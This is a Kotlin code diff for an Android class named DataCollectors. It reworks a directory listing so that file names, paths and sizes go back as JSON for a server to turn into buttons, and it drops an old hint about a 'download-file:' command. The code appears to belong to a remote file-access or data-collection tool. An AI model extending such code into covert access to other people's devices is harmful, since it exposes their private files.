@@ -687,31 +687,27 @@ class DataCollectors(private val context: Context) {
             val files = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
             if (files.isEmpty()) return CollectedData.TextResult("📁 المسار فارغ: $path")
             
-            val sb = StringBuilder()
-            sb.appendLine("📂 محتويات: $path")
-            sb.appendLine("━━━━━━━━━━━━━━━")
-            
-            // Add parent directory link
-            if (dir.parentFile != null) {
-                sb.appendLine("📁 ../ (السابق)")
+            // Return JSON with structured file data for server to build buttons
+            val jsonList = JSONArray()
+            for (f in files.take(100)) {
+                jsonList.put(JSONObject().apply {
+                    put("name", f.name)
+                    put("path", f.absolutePath)
+                    put("is_dir", f.isDirectory)
+                    put("size", f.length())
+                })
             }
             
-            for (f in files.take(200)) {
-                if (f.isDirectory) {
-                    sb.appendLine("📁 ${f.name}/")
-                } else {
-                    val sizeKB = f.length() / 1024
-                    val sizeStr = if (sizeKB > 1024) "${sizeKB / 1024}MB" else "${sizeKB}KB"
-                    sb.appendLine("📄 ${f.name} ($sizeStr)")
-                }
+            val result = JSONObject().apply {
+                put("type", "file_list")
+                put("path", dir.absolutePath)
+                put("parent", dir.parentFile?.absolutePath ?: "")
+                put("files", jsonList)
             }
             
-            sb.appendLine()
-            sb.appendLine("💡 لتحميل ملف، استخدم: download-file:${'$'}{dir.absolutePath}/filename")
-            
-            CollectedData.TextResult(sb.toString())
+            CollectedData.JsonResult(result.toString())
         } catch (e: SecurityException) { 
-            CollectedData.TextResult("❌ صلاحية مرفوضة: $path\nقد تحتاج إذن التخزين")
+            CollectedData.TextResult("❌ صلاحية مرفوضة: $path")
         }
         catch (e: Exception) { 
             CollectedData.TextResult("❌ خطأ: ${e.message ?: "unknown"}")
